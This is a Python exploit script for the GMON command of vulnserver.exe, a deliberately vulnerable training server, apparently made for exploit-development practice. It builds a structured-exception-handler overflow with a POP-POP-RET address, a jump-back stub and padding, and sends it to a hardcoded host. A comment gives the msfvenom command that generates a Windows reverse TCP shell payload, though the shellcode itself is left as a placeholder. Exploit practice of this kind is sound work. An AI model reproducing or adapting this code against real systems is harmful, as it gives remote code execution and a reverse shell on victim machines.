# Programmer: Brent "q0m" Chambers
# Date: 8/8/2017
# Filename: gmon_rce.py
# Description: Exploitation of vulnserver.exe's GMON command for remote code execution
# ************************************************************************************

#!/usr/bin/env python

import os
import sys
import struct
import socket
from subprocess import Popen,PIPE

def x86(addr):
	return struct.pack("<I",addr)

def execute(host, port, payload_list = [], recv_first=None):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect( (host,int(port)) )
	if len(payload_list):
		if recv_first:
			print s.recv(1024)
		for i in payload_list:
			s.send(i)
			print s.recv(1024)
	s.close()

# Shellcode generator command with MSFVENOM:
# $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.21 LPORT=443 -f c EXITFUNC=thread -b "\x00\x0a\x0d" 

shellcode = (<shellcode>)

ppr = x86(0x625010B4)

jmp_back = "\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1"

payload = ["GMON /.:/%s\n" %('\x90'*2485+shellcode+'\xcc'*659+"\x74\x06\x90\x90"+ppr+jmp_back+"\xcc"*(5000-3491-8-len(jmp_back))) ]

host = "192.168.100.21"
port = 9999

execute(host,
		port,
		payload_list=payload,
		recv_first=True)
